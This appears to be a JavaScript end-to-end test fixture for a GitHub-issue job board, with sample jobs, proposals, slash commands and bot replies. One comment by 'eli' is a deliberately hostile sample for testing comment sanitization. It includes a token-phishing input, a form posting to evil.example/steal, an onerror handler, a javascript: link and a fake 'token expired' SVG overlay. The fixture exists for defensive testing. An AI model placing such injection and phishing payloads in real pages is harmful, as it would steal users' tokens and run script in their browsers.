// Sample board data for the end-to-end tests: jobs in every state, proposals, comments (one of
// them hostile), and enough finished jobs to need paging.
import { formatBody } from '../shared/board.js'

export const REPO = 'octo/board'
export const PRIVATE_REPO = 'octo/board-private'
export const ADMIN = 'lead'

const COLORS = { lead: '#0f9d8a', alice: '#e5484d', bob: '#3e63dd', chen: '#f76b15', dana: '#8e4ec6', eli: '#12a594' }
const avatar = (login) => {
  const c = COLORS[login] ?? '#888'
  const svg = `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 40 40"><rect width="40" height="40" fill="${c}"/><text x="20" y="26" font-family="Arial" font-size="17" font-weight="700" fill="#fff" text-anchor="middle">${login[0].toUpperCase()}</text></svg>`
  return 'data:image/svg+xml;base64,' + Buffer.from(svg).toString('base64')
}
export const user = (login) => ({
  login,
  avatar_url: avatar(login),
  html_url: `https://github.com/${login}`,
  type: 'User',
})
const bot = {
  login: 'github-actions[bot]',
  avatar_url: avatar('eli'),
  html_url: 'https://github.com/apps/github-actions',
  type: 'Bot',
}

const now = Date.now()
const ago = (h) => new Date(now - h * 3600_000).toISOString()
const day = (offset) => {
  const d = new Date()
  d.setDate(d.getDate() + offset)
  return d.toISOString().slice(0, 10)
}
const L = (...names) => names.map((name) => ({ name }))

let n = 0
const issue = (o) => ({
  number: ++n,
  state: 'open',
  state_reason: null,
  comments: 0,
  closed_at: null,
  created_at: ago(o.age ?? 48),
  updated_at: ago(1),
  html_url: `https://github.com/${REPO}/issues/${n}`,
  assignees: [],
  ...o,
  user: user(o.by ?? 'lead'),
  assignees: (o.on ?? []).map(user),
  body: formatBody({ description: o.desc ?? '', due: o.due ?? null }),
})

const archive = Array.from({ length: 60 }, (_, k) => ({
  title: `Archived task ${k + 1}`,
  labels: [{ name: 'job' }, { name: 'P3' }],
  state: 'closed',
  state_reason: 'completed',
  on: ['bob'],
  age: 900 + k,
  closed_at: new Date(Date.now() - (200 + k) * 3600_000).toISOString(),
}))

export const issues = [
  issue({
    title: 'Fix WER computation for long-form audio',
    labels: L('job', 'P0'),
    due: day(-1),
    on: ['alice'],
    age: 120,
    desc: 'Long recordings (> 30 min) get chunked, and words at chunk boundaries are counted twice.\n\n**Done when**\n- [ ] boundary words are de-duplicated\n- [ ] WER on `longform-dev` matches the reference script within 0.1',
  }),
  issue({
    title: 'Collect 200 accented-English samples',
    labels: L('job', 'P1'),
    due: day(4),
    age: 96,
    desc: 'We need more coverage for Indian, Nigerian and Scottish English. Use the consent form in `docs/consent.md`.',
  }),
  issue({
    title: 'Write the evaluation protocol doc',
    labels: L('job', 'P1'),
    due: day(2),
    on: ['bob', 'chen'],
    age: 80,
    desc: 'One page: metrics, normalization rules, how we split dev/test. Draft in the shared doc first.',
  }),
  issue({
    title: 'Set up the public leaderboard page',
    labels: L('job', 'P2'),
    due: day(15),
    age: 70,
    desc: 'Static page that reads `results/*.json`.',
  }),
  issue({
    title: 'Add speaker-overlap subset (2–3 speakers)',
    labels: L('job', 'P2'),
    due: day(21),
    age: 30,
    desc: '',
  }),
  issue({
    title: 'Clean up old notebooks in /scratch',
    labels: L('job', 'P3'),
    age: 200,
    desc: 'Archive anything older than August.',
  }),
  issue({
    title: 'Benchmark Whisper v4 and Parakeet on the dev set',
    labels: L('proposal', 'P1'),
    by: 'dana',
    age: 20,
    due: day(10),
    desc: 'Both came out last month; reviewers will ask. I can run them on the lab GPUs over the weekend.',
  }),
  issue({
    title: 'Add a Mandarin subset',
    labels: L('proposal', 'P2'),
    by: 'chen',
    age: 6,
    desc: 'I have ~5h of read speech with transcripts from my previous project. Licensing is CC-BY.',
  }),
  issue({
    title: 'Draft the dataset license',
    labels: L('job', 'P1'),
    state: 'closed',
    state_reason: 'completed',
    on: ['lead'],
    age: 300,
    closed_at: ago(52),
  }),
  issue({
    title: 'Recruit 10 annotators',
    labels: L('job', 'P1'),
    state: 'closed',
    state_reason: 'completed',
    on: ['alice', 'eli'],
    age: 400,
    closed_at: ago(140),
  }),
  issue({
    title: 'Use a different font on the slides',
    labels: L('proposal', 'P3'),
    by: 'eli',
    state: 'closed',
    state_reason: 'not_planned',
    age: 100,
    closed_at: ago(90),
  }),
  ...archive.map((a) => issue(a)),
]

let cid = 100
const comment = (num, login, body, h, extra = {}) => ({
  id: ++cid,
  issue_number: num,
  body,
  user: login === 'bot' ? bot : user(login),
  created_at: ago(h),
  updated_at: ago(h),
  html_url: `https://github.com/${REPO}/issues/${num}#issuecomment-${cid}`,
  reactions: { '+1': 1, confused: 0 },
  ...extra,
})

// A member tried an admin-only command; the bot said no (😕 and a reply naming it), then a teammate 👍'd it.
const approveAttempt = comment(1, 'dana', '/approve', 25.2, { reactions: { '+1': 1, confused: 1 } })
// Two commands at once: the first went through, the second didn't.
const halfDone = comment(1, 'sam', '/take\n/due tomorrow', 24.9, { reactions: { '+1': 0, confused: 1 } })

export const comments = [
  approveAttempt,
  halfDone,
  comment(
    1,
    'bot',
    `@sam I couldn't do that:\n- \`/due tomorrow\`: I could not read that date.\n\n<!-- job board: failed ${halfDone.id} -->`,
    24.8,
  ),
  comment(
    1,
    'bot',
    `@dana I couldn't do that:\n- \`/approve\`: only admins can approve proposals.\n\n<!-- job board: failed ${approveAttempt.id} -->`,
    25.1,
  ),
  comment(1, 'alice', '/take', 26, { reactions: { '+1': 1, confused: 1 } }), // someone's 😕 next to the bot's 👍
  comment(1, 'sam', '/drop @alice', 25, { reactions: { '+1': 0, confused: 1 } }),
  comment(
    1,
    'sam',
    '/reject Duplicate of https://github.com/octo/board/issues/1#issuecomment-1234567890123456789012345678901234567890',
    25,
    { reactions: { '+1': 0, confused: 1 } },
  ),
  comment(1, 'alice', 'Found it: the overlap window is applied twice in `chunker.py`. PR coming tonight.', 5),
  comment(3, 'bob', '/take', 40),
  comment(3, 'chen', 'I can write the normalization section.\n/take', 30),
  comment(1, 'lead', '/priority P0', 24),
  comment(7, 'bob', '+1, this would be really useful for the paper.', 10),
  comment(7, 'dana', '/approve', 9, { reactions: { '+1': 0, confused: 1 } }),
  comment(7, 'bot', "@dana I couldn't do that:\n- `/approve`: only admins can approve proposals.", 9),
  comment(9, 'lead', '/done', 52),
  comment(
    6,
    'eli',
    [
      'Before you start, paste your token below to confirm:',
      '<input type="password" placeholder="ghp_… your token" id="decline-reason" class="input">',
      '<div style="position:fixed;inset:0;background:#c00">overlay</div>',
      '<button class="btn btn-primary">Connect</button>',
      '<form action="https://evil.example/steal"><textarea name="t"></textarea></form>',
      '<img src="https://evil.example/pixel.png" onerror="window.__pwned = true">',
      '[click me](javascript:window.__pwned=true)',
      '<svg width="1" height="1" overflow="visible"><a href="https://evil.example/login"><rect x="-3000" y="-3000" width="8000" height="8000" fill="white"/><text x="20" y="40">Your GitHub token expired</text></a></svg>',
      '<math><mtext><a href="https://evil.example/m">math link</a></mtext></math>',
      'See [the guide](https://docs.github.com/issues) for details.',
      '- [x] a real task list still renders\n  - [ ] its sub-task<style>.x{color:red}</style>',
    ].join('\n\n'),
    3,
  ),
]

/** What the published site would ship as data.json for this data. */
export function snapshot() {
  return { version: 1, repo: REPO, generatedAt: ago(0.05), issues, comments }
}
